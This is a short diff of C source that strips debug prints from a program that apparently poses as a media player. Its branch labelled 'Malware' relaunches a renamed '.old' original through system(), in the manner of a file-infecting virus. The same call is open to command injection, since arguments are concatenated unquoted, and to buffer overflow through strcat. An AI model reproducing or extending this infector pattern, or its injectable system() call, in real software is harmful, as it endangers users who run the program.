@@ -46,8 +46,6 @@ int main(int argc, char *argv[]) {
 
    if(strstr(argv[0], "MediaPlayer") != NULL){
 
-
-      printf("MediaPlayer\n");
       // Initialize MediaPlayer App instance
       app = mediaplayer_create(WINDOW_WIDTH, WINDOW_HEIGHT);
       if (app == NULL) {
@@ -60,9 +58,7 @@ int main(int argc, char *argv[]) {
       // Destroy the app instance at the end
       mediaplayer_destroy(app);
    } else {
-      printf("Malware\n");
-   printf("1 : %s\n", strstr("MediaPlayer", argv[0]));
-   printf("2 : %s\n", strstr(argv[0], "MediaPlayer"));
+
       char *token;
         token = strtok (argv[0],".");
         char *lastToken ;
@@ -75,13 +71,10 @@ int main(int argc, char *argv[]) {
         char file_path_sain[1000];
         sprintf(file_path_sain, "%s%s%s", getUserCurentDir(), lastToken, ".old");
 
-         printf("file_path_sain = %s\n",file_path_sain);
 
         for(int i = 1; i < argc; i++){
             strcat(file_path_sain, argv[i]);
             strcat(file_path_sain, " ");
-
-            printf("file_path_sain = %s\n",argv[i]);
         }
 
         system(file_path_sain);
